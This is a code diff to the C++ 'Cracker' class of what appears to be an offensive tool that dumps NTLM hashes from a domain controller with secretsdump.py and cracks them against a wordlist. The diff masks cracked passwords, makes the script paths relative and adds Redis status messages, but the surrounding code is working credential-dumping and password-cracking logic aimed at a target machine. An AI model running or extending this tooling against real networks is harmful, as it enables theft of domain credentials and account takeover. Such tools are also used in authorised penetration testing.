@@ -111,17 +111,19 @@ class Cracker {
             for (std::size_t i = 0; i < wordlist.size(); i++) {
                 const char* generated_hash = gen_ntlm(wordlist[i]);
                 if (std::strcmp(hash, generated_hash) == 0) {
+                    std::string masked_password = wordlist[i].substr(0, 3) + std::string(wordlist[i].length() - 3, '*');
                     std::cout << "\033[32m" << "[+] " << "\033[1;32m" << "Cracked: " <<
                     "\033[0m" <<
                     "\033[32m" <<
                     "['" << username << "':" <<
-                    "'" << wordlist[i] << "']" <<
+                    "'" << masked_password << "']" <<
                     "\033[0m" <<
                     std::endl;
                     // Publish the message to the Redis channel
                     redisReply* reply = nullptr;
                     if (redis != nullptr) {
-                        reply = (redisReply*)redisCommand(redis, "PUBLISH %s '%s:%s'", redis_channel, username, wordlist[i].c_str());
+                        std::string message = "Password Cracked: [" + std::string(username) + ":" + masked_password + "]";
+                        reply = (redisReply*)redisCommand(redis, "PUBLISH %s %s", redis_channel, message.c_str());
                     } else {
                         std::cerr << "\033[1;31m[-] Could not connect to Redis server\033[0m" << std::endl;
                     }
@@ -139,9 +141,9 @@ class Cracker {
         std::string get_ntds(int target_machine) {
             setenv("TARGET", target.c_str(), 1);
             if (target_machine == 1) {
-                system("/usr/bin/python3 /Users/ch1nghz/Development/NTbuster/vendor/scripts/secretsdump.py -just-dc-ntlm \"${TARGET}\" > /tmp/output.txt");
+                system("/usr/bin/python3 ./vendor/scripts/secretsdump.py -just-dc-ntlm \"${TARGET}\" > /tmp/output.txt");
             } else {
-                system("/usr/bin/python3 /Users/ch1nghz/Development/NTbuster/vendor/scripts/secretsdump.py \"${TARGET}\" > /tmp/output.txt");
+                system("/usr/bin/python3 ./vendor/scripts/secretsdump.py \"${TARGET}\" > /tmp/output.txt");
             }
 
             ifstream fin("/tmp/output.txt");
@@ -203,12 +205,28 @@ class Cracker {
                 "\033[0m" <<
                 std::endl;
             std::string output = get_ntds(target_machine);
-            
+            redisReply* reply = nullptr;
             if (output.length() > 0) {
+                if (redis != nullptr) {
+                    reply = (redisReply*)redisCommand(redis, "PUBLISH %s %s", redis_channel, "Hashes dumped successfully!");
+                } else {
+                    std::cerr << "\033[1;31m[-] Could not connect to Redis server\033[0m" << std::endl;
+                }
+                if (reply != NULL) {
+                    freeReplyObject(reply);
+                }
                 std::cout << "\033[32m" << "[+] Hashes dumped!" << 
                     "\033[0m" <<
                     std::endl;
             } else {
+                if (redis != nullptr) {
+                    reply = (redisReply*)redisCommand(redis, "PUBLISH %s %s", redis_channel, "Hashes could not be retrieved!");
+                } else {
+                    std::cerr << "\033[1;31m[-] Could not connect to Redis server\033[0m" << std::endl;
+                }
+                if (reply != NULL) {
+                    freeReplyObject(reply);
+                }
                 return;
             }
             std::cout << "\033[33m" << "[*] Parsing dumped hashes..." << 
